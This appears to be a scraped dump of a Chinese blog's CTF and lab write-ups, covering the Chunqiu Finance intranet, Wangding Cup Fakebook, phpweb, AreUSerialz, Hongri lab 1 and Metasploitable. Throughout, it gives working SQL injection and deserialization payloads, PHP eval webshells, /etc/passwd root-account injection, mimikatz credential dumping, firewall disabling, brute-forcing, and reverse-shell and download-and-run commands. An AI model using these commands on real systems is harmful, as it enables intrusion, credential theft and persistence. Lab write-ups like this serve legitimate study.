DeEpinGh0st/MDUT-Extend-Release: MDUT-Extend(扩展版本) 这里用Udf提权开启命令执行，然后写一个特权账户到 /etc/passwd 123456┌──(root㉿kali)-[~/Desktop/ChunQiu/Finance]└─# openssl passwd -6 123123 #生成密码hash$6$QrMcMXsfxBnF/K4m$xWsqsAYqpZEX649U/O5RqIzCUkjknjFzuvBksmKNz8r4L13zgWVW/Y3bs7jteMvSgAF7dVDtsPhfizTDKyPmD0#写到/etc/passwd （这里哈希密码有很多特殊符号用base64编码后写入）echo YzF0cnVzOiQ2JGlqL1o4Y3FxYXdPQTJzR2skYW1EVzVWZnhJMklsUURUem1lRG9XYTFKZlRJYjBsTm8yVGFMc3E3c3JsTWNEWFFiV1k3dUNJaE1zZWE0SE8uN2dQSDFxcVUyQkI3THZlN2p6Ny5WWTA6MDowOnJvb3Q6L2hvbWUvYzF0cnVzOi9iaW4vYmFzaA== |base64 -d&gt;&gt; /etc/passwd 生成hash的时候这里去你的kali上执行，去它那个服务器跑不了 PS: 我感觉写 /etc/passwd 这一步可能也可以在Jeecgboot的利用工具中完成，但是我没成功过xshell链接拿到第一个flag 内网代理(第一层)进来后先看下网络连接，可以发现有个redis的docker，但里面没有什么东西，此外mysql数据库里面也是没有什么东西的然后看一下网卡信息,看看内网网段 1234567891011121314151617181920212223242526272829303132333435root@web01:/# ifconfigdocker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 inet6 fe80::42:e2ff:fe68:591a prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:e2:68:59:1a txqueuelen 0 (Ethernet) RX packets 797 bytes 36609 (36.6 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 805 bytes 48471 (48.4 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.22.10.22 netmask 255.255.255.0 broadcast 172.22.10.255 inet6 fe80::216:3eff:fe06:4124 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:06:41:24 txqueuelen 1000 (Ethernet) RX packets 91570 bytes 9390063 (9.3 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 95309 bytes 218743007 (218.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 27655 bytes 8040046 (8.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 27655 bytes 8040046 (8.0 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0veth0eeff78: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::60fc:52ff:fea9:61d7 prefixlen 64 scopeid 0x20&lt;link&gt; ether 62:fc:52:a9:61:d7 txqueuelen 0 (Ethernet) RX packets 797 bytes 47767 (47.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 820 bytes 49617 (49.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ph4ntonn/Stowaway：👻Stowaway ——渗透测试者的多跳代理工具 1netstat -lntp 123456789#（靶机web01执行）root@web01:/# chmod +x linux_x64_agent root@web01:/# ./linux_x64_agent -l 222025/11/15 02:25:19 [*] Starting agent node passively.Now listening on port 22 #(你的VPS执行)# ./linux_x64_admin -c $靶机IP:22 (admin) &gt;&gt; use 0(node 0) &gt;&gt; socks 9999 这样就行搭好代理了，可以通过 vpsIP:9999 作为跳板访问到内网10网段 在kali上配置 /etc/proxychains4.conf 通过proxychains来使用代理 windows上使用proxyfier配置来使用代理 (地址为你的vps IP) 内网扫描上传Fscan到web01对内网10网段进行扫描 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152root@web01:/root# ./FScan_2.0.1_linux_x64 -h 172.22.10.22/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[1.8s] 已选择服务扫描模式[1.8s] 开始信息扫描[1.8s] CIDR范围: 172.22.10.0-172.22.10.255[1.8s] generate_ip_range_full[1.8s] 解析CIDR 172.22.10.22/24 -&gt; IP范围 172.22.10.0-172.22.10.255[1.9s] 最终有效主机数量: 256[1.9s] 开始主机扫描[1.9s] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[1.9s] [*] 目标 172.22.10.22 存活 (ICMP)[1.9s] [*] 目标 172.22.10.17 存活 (ICMP)[1.9s] [*] 目标 172.22.10.253 存活 (ICMP)[1.9s] [*] 目标 172.22.10.88 存活 (ICMP)[4.9s] 存活主机数量: 4[4.9s] 有效端口数量: 233[4.9s] [*] 端口开放 172.22.10.22:6379[4.9s] [*] 端口开放 172.22.10.22:80[4.9s] [*] 端口开放 172.22.10.22:3306[4.9s] [*] 端口开放 172.22.10.22:8081[4.9s] [*] 端口开放 172.22.10.22:8080[4.9s] [*] 端口开放 172.22.10.17:22[4.9s] [*] 端口开放 172.22.10.88:21[4.9s] [*] 端口开放 172.22.10.88:80[4.9s] [*] 端口开放 172.22.10.88:445[4.9s] [*] 端口开放 172.22.10.88:139[4.9s] [*] 端口开放 172.22.10.88:135[7.9s] 扫描完成, 发现 11 个开放端口[7.9s] 存活端口数量: 11[7.9s] 开始漏洞扫描[7.9s] [*] NetInfo 扫描结果目标主机: 172.22.10.88主机名: web02发现的网络接口: IPv4地址: └─ 172.22.10.88[7.9s] [*] 网站标题 http://172.22.10.22 状态码:200 长度:14323 标题:FinancePro ERP系统[8.0s] [+] NetBios 172.22.10.88 WORKGROUP\\WEB02 [8.0s] [*] 网站标题 http://172.22.10.88 状态码:403 长度:199 标题:403 Forbidden[8.0s] POC加载完成: 总共387个，成功387个，失败0个[8.1s] [+] FTP服务 172.22.10.88:21 匿名登录成功![8.1s] [*] 网站标题 http://172.22.10.22:8080 状态码:404 长度:682 标题:HTTP Status 404 – Not Found[8.1s] [*] 网站标题 http://172.22.10.22:8081 状态码:200 长度:1766 标题:&quot;&quot;[36.6s] 扫描已完成: 18/18","link":"/2025/12/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFinance--%E5%A4%96%E7%BD%91%E6%89%93%E9%9D%B6/"},{"title":"","text":"网鼎杯 2018–Fakebook 扫到目录robots.txt 访问/user.php.bak 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} 这里看到view.php路径 然后可以大致判断flag应该在 1/var/www/html/flag.php 这里发现sql注入 1?no=1 and 1=1 判断列数4列 1?no=1 order by 4--+ 回显位为2 1?no=-1 union/**/select 1,2,3,4--+ 查数据库为fakebook 1?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata--+ 得到以下数据库 fakebook,information_schema,mysql,performance_schema,test 爆表 1?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;--+ 得到表名users 爆字段 1?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;--+ 得到字段是no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 最后查数据 1?no=-1 union/**/select 1,concat(no,&quot;\\n&quot;,username,&quot;\\n&quot;,passwd,&quot;\\n&quot;,data),3,4 from users--+ 得到如下数据 11 admin c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;} data字段为我们刚join注册的数据序列化的形式 注意到源代码是iframe格式前面的分析可知flag.php的路径，ssrf可以伪协议file://,把序列化字符串作为参数输入测试，将blog值改为百度的网址 1no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:22:&quot;https://www.baidu.com/&quot;;}' 这里我没成功，暂时不知道什么原因 这边由于原本的https://www.baodu.com/是22，所以构造payload时这边改成file:///var/www/html/flag.php要更改长度为29 1?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' 解码得到flag","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018--Fakebook/"},{"title":"","text":"网鼎杯 2020 朱雀组–phpweb 这个先放御剑扫一下，没出货然后观察到它是一直刷新的，我们用bp抓一下包 这里看到请求传了一个func和pfunc猜测是function,p应该是payload（猜的） 1func=file_get_contents&amp;p=index.php 传过去得到如下代码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 先禁用了一大堆函数得到源码以后才知道原来是call_user_func()函数，还是见得少了，大佬估计直接能看出来是这个函数，我还要靠猜。 1$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); 这里那么多函数被禁了，主要还是禁了system比较难受，但是问题不大，毕竟没有禁file_get_contents、cat以及serialize。 这里serialize才是重点（敲黑板！），毕竟源码里给我们提供了一个Test类： 123456789class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }} 然后简单明了构造payload: 1234567891011121314151617181920&lt;?php class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $a = new Test(); // $a-&gt;p = 'ls ../../../'; ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:12:&quot;ls ../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} // $a -&gt; p = &quot;find / -name 'flag*'&quot;; ⇒ O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;find / -name 'flag*'&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; p = 'cat /tmp/flagoefiu4r93'; // ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; func = 'system'; echo (serialize($a)); ?&gt;","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84--phpweb/"},{"title":"","text":"网鼎杯 2020 青龙组–AreUSerialz 题目给了源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 分析一下GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化在反序列化的过程中，调用__destruct析构方法 1234567function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } 如果op===&quot;2&quot; ，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较 12345678910public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); }} 进入process函数后，如果op==&quot;1&quot; 那么进入write函数，若op==&quot;2&quot; ,则进入write函数，否则输出报错，可以看出来这里op与字符串的比较变成了若比较类型==所以我们之哦呀哦令op==2 ,这里2是整数int.当op=2时,op===&quot;2&quot; 为flaseop==&quot;2&quot; 为true,接着进入read函数 1234567private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res;} filename是我们可以控制的，接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件，获取到文件后使用output函数输出 1234private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s;} 整个利用思路就很明显了，还有一个需要注意的地方是，filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php class FileHandler { protected $op=2; protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; // $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; // $this-&gt;process(); } } $A=new FileHandler(); $B=serialize($A); echo $B; 输出 在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可 即: 123public $op=2;public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;public $content; 现在得到的结果就没有%00字符了 1O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;} 得到payload 1http://82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;}","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--AreUSerialz/"},{"title":"","text":"红日靶场+METASPLOITABLE打靶 红日靶场一先扫网段 1nmap -sn -PR -n 192.168.52.0/24 -sn: 跳过端口扫描，只确认是否在线-PR: 使用基于 ARP 协议的主机扫描，内网首选-n: 不进行反向 DNS 解析，可提高扫描速度 然后按级别到10扫端口 1sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10 -sS: 使用 TCP SYN 半开放扫描 (必须使用 root 权限运行)-sC: 使用默认的脚本扫描，可扫描出更多信息 (比如网页标题)-Pn: 不进行活跃主机扫描，因为扫描对象已知是活跃主机-n: 不进行反向 DNS 解析，提高扫描速度-sV: 扫描服务版本信息-p 1-65535: 指定扫描的端口范围为所有 TCP 端口80端口 从上图可看出 192.168.52.10 主机开放了 80 端口，运行了 HTTP 服务，站点标题为 phpStudy，即使用小皮面板搭建的 web 站点。浏览器访问 http://192.168.1.10，可以看到 phpinfo.php 文件被展示了出来，可被收集到大量 PHP 配置信息： 2.1.3 站点目录扫描使用 wfuzz 来扫描 http://192.168.52.10/ 的站点目录： 1wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ -w /usr/share/wordlists/dirb/common.txt: 指定 wfuzz 使用 kali 内置的常见目录和文件名字典文件来爆破--hc 404: hide code 404，即当返回状态码为 404 (未找到) 时，wfuzz 不显示该结果192.168.52.10/FUZZ: FUZZ 为占位符，字典文件中的每一行都会替换掉 FUZZ，并将替换后的 URL 发送给服务器，然后分析服务器的 http 状态码 /phpadmin弱密码root.root 1wget http://192.168.52.10/beifen.rar 这里直接告诉我们后台地址了源码中也可以看到因为直接拿源码了太简单了在留言板/index.php?r=default/extend/index&amp;id=100023页面输入 12hello admin!!&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt; 构成xss 单击审核按钮，使该留言通过审核从而显示在留言板页面：然后用户界面就会弹窗了 yxcms 后台文件上传漏洞 登录到 yxcms 的后台，进入” 前台模板”，管理模板文件并新建模板文件，名称为 hack, 内容为 php 一句话木马: &lt;?php @eval($_POST['hack']);?&gt;: 但是不知道文件位置这里我们直接去但是我们有源码可以知道这个页面其他文件的位置yxcms\\protected\\apps\\default\\view\\default 得到文件路径 1http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php 然我们直接去antsword连接 net sessionnet session 命令的核心作用是展示 “会话连接”，具体能查到以下关键信息： 远程计算机名称 / IP：显示哪个设备（比如另一台电脑、服务器）正在连接你的电脑。 连接类型：通常是 “Microsoft Windows Network”，即通过 Windows 网络共享建立的连接。 连接状态：显示连接是 “已建立” 还是 “断开” 等状态。 登录用户名：显示远程设备用哪个账号登录到你的电脑（仅部分场景显示）。 到phpadmin访问写一句话 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot; INTO OUTFILE &quot;C:\\Users\\Administrator\\Desktop\\phpStudy\\WWW\\hack.php&quot;; 命令执行后出现了报错，提示 MySQL 服务器配置了 secure-file-priv 选项，限制了该命令的执行，执行以下命令查询该选项的状态： 1SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;; 从上图可知 secure-file-priv 选项被设置为了 NULL, MySQL 服务器会禁止文件导入与导出功能。尝试使用以下命令修改 secure-file-priv 选项的值为空字符，使其不做目录限制: 1SET GLOBAL secure_file_priv = ''; 现在该变量为只读，无法修改尝试从 MySQL 命令执行日志下手，执行 SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;，查看命令执行日志开关和日志文件路径： 12SET GLOBAL general_log=on; SET GLOBAL general_log_file='C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php'; 命令执行会自动在命令后面加上注释提示返回结果。执行 SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;; 手动验证一下： 从上图可知修改成功。后面执行的所有 MySQL 命令都会被记录在网站根目录下的 hack.php 文件中 (只记录命令，不记录结果)，此时再执行以下命令将一句话木马记录到日志文件中： 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot;; 内网打靶先传cs马🐎到服务器上，然后直接点鼠标就提权成功了 这里我们接看密码输入 1logonpasswords 得到上图后直接去就得到了密码从上图可以看到 administrator 用户的登录密码为 admin123!, 所属域为 god, 密码来源为 mimikatz 工具。 查询远程桌面控制 (RDP) 3389 端口是否启用： 1shell netstat -ano | findstr 3389 输出为空行，说明未启用，使用此命令开启 RDP： 1shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 操作成功，再次执行 shell netstat -ano | findstr 3389 验证结果： 启用成功。WIN+R 打开运行窗口输入 mstsc.exe 回车打开 RDP 客户端程序，使用 god/administrator 用户连接服务器的远程桌面：这里是GOD\\Administrator发现连接失败，namp扫一下 1nmap -Pn -n -p 3389 192.168.52.10 发现端口为 filtered 被过滤状态，说明可能存在防火墙拦截，执行 shell netsh advfirewall show allprofiles 命令查看防火墙状态： 从上图可看到防火墙状态为打开且拦截了入站数据，执行 shell netsh advfirewall set allprofiles state off 命令尝试关闭服务器的防火墙 (或者执行此命令单独放行 RDP 流量 netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389)： 执行成功，再次验证配置：shell netsh advfirewall show allprofiles 连接成功，同时观察到桌面 (左上角) 上有 nmap 应用程序。 在 CS 中执行 shell ipconfig 从上图可看到服务器除了有和和攻击机同网段的 192.168.52.10/24 的外网 IP 以外，还有内网 IP192.168.52.143/24。 继续在 CS 中使用服务器自带的 nmap 扫描内网有哪些活跃主机：shell nmap -sn -PR -n 192.168.52.143/24。注意，此命令必须在 Administrator 用户的 beacon 控制台下执行，在 System 用户下无法执行，因为 System 用户无法正确读取到环境变量，除非使用命令的完整路径来执行，比如 shell &quot;C:\\Program Files (x86)\\Nmap\\nmap.exe&quot; -sn -PR -n 192.168.52.143/24: 1234567192.168.52.1192.168.52.141192.168.52.254192.168.52.2192.168.52.138192.168.52.10192.168.52.143 3.1.6 域成员身份确定由于前面已经确定 Win7 服务器所属域为 god, 因此另外两台活跃主机一定有一台是域控制器 DC, 使用 net view 命令 (注意不要加 shell 前缀，否则结果不完整) 探测域内主机： 1net view 从上图可看到 192.168.52.138 的主机名为 OWA(全称应该是 Outlook Web App)，为主域控制器 PDC (Primary Domain Controller),192.168.52.141 的主机名为 ROOT-TVI862UBEH, 和 Win7 服务器一样同属于 god 域的域成员。 命令执行完成后，CS 会自动将探测到的设备加入” 目标列表”(注意，图中的 198.18.*.* 为本地基准测试 IP，在这里无实际意义，不必在意): 3.1.7 域成员端口扫描在 CS 的 Administrator 用户的 beacon 控制台中依次执行以下两条命令来分别扫描 192.168.52.138 和 192.168.52.141 两台主机的端口状态： 12shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138 shell nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141 从上面两张图片中可以看出这两台主机都开放了 SMB 协议的 445 端口，那么接下来可以尝试使用 CS 内置的 psexec 工具获取目标的 system shell。 3.2 横向移动 创建一个 SMB 监听器，名字为 wxdx，Payload 为 Beacon SMB： METASPLOITABLE-1kali攻击机，inet 172.20.10.4 netmask 255.255.255.240 网段：172.20.10.0/28 METASPLOITABLE-1 靶机，addr:172.20.10.3Bcast:172.20.10.15Mask:255.255.255.240 1netdiscover -r 172.20.10.0/28 -i eth0 扫到IP nmap扫端口 12nmap 172.20.10.3nmap -v -T4 -p- -A -oN nmap.log 172.20.10.3 扫目录 1python3 dirsearch -u 172.20.10.3 到 1http://172.20.10.3/tikiwiki 看看 发现TikiWiki 1.9.5是存在RCE漏洞的 爆破FTP我们这里先尝试爆破一下ftp 1hydra -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/pass.txt ftp://172.20.10.3 已经成功爆破出 4 组有效的 FTP 账号和密码，具体信息如下： 账号：postgres，密码：postgres 账号：user，密码：user 账号：service，密码：service 账号：msfadmin，密码：msfadmin 爆破SSH九头蛇不知道为什么爆不出来 1medusa -h 172.20.10.3 -U user.txt -P pass.txt -M ssh -n 22 -t 4 -v 4 1telnet 172.20.10.3 输入用户名密码也是成功拿下权限 端口渗透利用metasploit然后启动msf 1msfconsole 端口1：6637——-irc_3281_backdoor登录msf 1search irc 找到对应模块 1use exploit/unix/irc/unreal_ircd_3281_backdoor 进入对应模块 查看配置 show options 1show options 设置主机名 进行漏洞利用 exploit 利用，成功获取会话，root权限 123set rhost 172.20.10.3set LHOST 172.20.10.4set LPORT 4444 RHOST是靶机IPRPORT设置攻击目标主机端口号LHOST是攻击机IP 这里靶机的6687端口没有开放所以没有成功利用到开放了如下端口，然后上面那个nmap也能看得到开放了哪些端口如果利用到了是这样的 端口2：6200——-vsftpd_234_backdoor6200靶机也没开放，我们这里还是讲一下手法 利用metasploit找到利用模块 1search sftpd 切换模块 查看配置 12use exploit/unix/ftp/vsftpd_234_backdoorshow options 反弹会话，root权限 12345678910set RHOSTS 目标IPset RPORT 21 #vsftpd 默认端口为 21set payload cmd/unix/reverseset LHOST 攻击机IPset LPORT 4444exploit 1id # 若显示 uid=0(root)，则已获取 root 权限 查看系统信息，寻找提权漏洞 12cat /etc/os-release # 查看系统版本 uname -r # 查看内核版本 提权利用内核漏洞提权（示例：脏牛漏洞，适用于特定内核版本）在攻击机生成提权脚本（需对应目标架构，如 x86/x64） 1msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -f elf &gt; dirtycow.elf 在目标会话中下载并执行（攻击机需开启 HTTP 服务，如 python3 -m http.server 80）： 1234# 目标 shell 中操作wget http://攻击机IP:80/dirtycow.elf # 下载提权程序chmod +x dirtycow.elf # 赋予执行权限./dirtycow.elf # 执行提权，成功后会获得 root shell 利用 SUID 程序提权查找具有 SUID 权限的危险程序（如 find、bash 等）： 1find / -perm -4000 2&gt;/dev/null # 列出所有 SUID 程序 # 若存在可利用程序，例如 